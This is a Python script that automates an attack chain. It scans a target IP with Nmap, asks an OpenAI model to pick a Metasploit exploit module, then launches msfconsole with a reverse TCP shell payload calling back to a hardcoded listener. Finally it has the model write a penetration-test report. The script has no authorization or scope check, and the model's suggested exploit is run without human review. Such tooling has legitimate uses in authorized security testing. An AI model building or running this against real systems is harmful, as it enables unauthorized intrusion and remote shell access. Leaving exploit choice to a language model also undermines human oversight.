import openai
import subprocess
import os
import re
import time

# Load OpenAI API key securely from environment variables
openai.api_key = os.getenv("OPENAI_API_KEY")
client = openai.OpenAI()

def run_nmap(ip):
    """Runs an Nmap scan and returns the results."""
    print(f"[+] Running Nmap scan on {ip}...")
    cmd = ["nmap", "-p", "1-100", ip]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        return result.stdout
    except subprocess.TimeoutExpired:
        return "[!] Nmap scan timed out."
    except Exception as e:
        return f"[!] Error running Nmap: {e}"

def ask_chatgpt(prompt):
    """Asks ChatGPT for analysis and recommendations."""
    try:
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[
                {"role": "system", "content": "You are a cybersecurity expert."},
                {"role": "user", "content": prompt}
            ],
            temperature=0.7
        )
        return response.choices[0].message.content.strip()
    except Exception as e:
        return f"[!] OpenAI API error: {e}"

def extract_exploit_suggestion(chatgpt_response):
    """Extracts Metasploit exploit suggestions from ChatGPT response."""
    exploit_patterns = [r"exploit/[a-zA-Z0-9_/]+"]
    for pattern in exploit_patterns:
        match = re.search(pattern, chatgpt_response)
        if match:
            return match.group(0)
    return None

def run_metasploit(target_ip, exploit_module):
    """Runs Metasploit with the selected exploit and keeps session open."""
    if not exploit_module:
        return "[!] No valid exploit module found."

    resource_script = f"""
use {exploit_module}
set RHOSTS {target_ip}
set LHOST 10.0.2.15
set PAYLOAD generic/shell_reverse_tcp
set LPORT 4444
exploit -j
sessions -i
"""

    rc_filename = "temp_msf.rc"
    with open(rc_filename, "w") as f:
        f.write(resource_script)

    try:
        print(f"[*] Launching Metasploit with resource script...")
        subprocess.run(["msfconsole", "-r", rc_filename], text=True)
        return "[+] Metasploit session handled manually. Check msfconsole for shells."
    except Exception as e:
        return f"[!] Error executing Metasploit: {e}"

def generate_report(ip, nmap_results, chatgpt_analysis, exploit_results):
    """Generates a penetration test report and saves it to a file."""
    print("[+] Generating report...")
    report_prompt = f"""
Create a professional penetration testing report for {ip} based on these findings:

Nmap Scan Results:
{nmap_results}

ChatGPT Analysis:
{chatgpt_analysis}

Exploitation Results:
{exploit_results}

Highlight the chosen exploit and steps to verify successful exploitation.
"""

    report = ask_chatgpt(report_prompt)
    filename = f"pentest_report_{ip}.txt"

    with open(filename, "w") as f:
        f.write(report)

    print(f"[+] Report saved as {filename}!")
    return report

def main():
    target_ip = input("Enter Target IP: ").strip()

    nmap_results = run_nmap(target_ip)
    if "[!]" in nmap_results:
        print(nmap_results)
        return

    chatgpt_analysis = ask_chatgpt(f"""
Analyze this Nmap scan and suggest a Metasploit exploit module in 'exploit/xyz' format.
Only suggest Kali Linux valid Metasploit modules. No general advice.
Nmap Scan Results:
{nmap_results}
""")

    print("[DEBUG] Full ChatGPT Response:", chatgpt_analysis)
    exploit = extract_exploit_suggestion(chatgpt_analysis)

    if not exploit:
        print("[!] No valid exploit found. Stopping.")
        return

    print(f"[+] Selected Exploit: {exploit}")

    exploit_results = run_metasploit(target_ip, exploit)

    report = generate_report(target_ip, nmap_results, chatgpt_analysis, exploit_results)
    print("\n[+] FINAL REPORT:\n", report)

if __name__ == "__main__":
    main()
